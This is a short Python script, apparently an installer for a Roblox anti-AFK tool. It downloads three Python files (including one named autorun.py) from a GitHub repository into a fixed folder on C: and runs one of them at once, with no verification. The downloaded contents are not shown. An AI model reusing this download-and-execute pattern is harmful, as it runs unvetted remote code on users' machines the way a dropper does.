import requests
import winshell
from win32com.client import Dispatch
url = 'https://raw.githubusercontent.com/Juliasmatius/fjjfgjhfg/main/main.py'
r = requests.get(url, allow_redirects=True)
open('c:/julinjutut/main.py', 'wb').write(r.content)
url = 'https://raw.githubusercontent.com/Juliasmatius/fjjfgjhfg/main/autorun.py'
r = requests.get(url, allow_redirects=True)
open('c:/julinjutut/autorun.py', 'wb').write(r.content)
url = 'https://raw.githubusercontent.com/Juliasmatius/fjjfgjhfg/main/roblox_antiafk.py'
r = requests.get(url, allow_redirects=True)
open('c:/julinjutut/roblox_antiafk.py', 'wb').write(r.content)
import os
os.system("python3 c:/julinjutut/main.py")
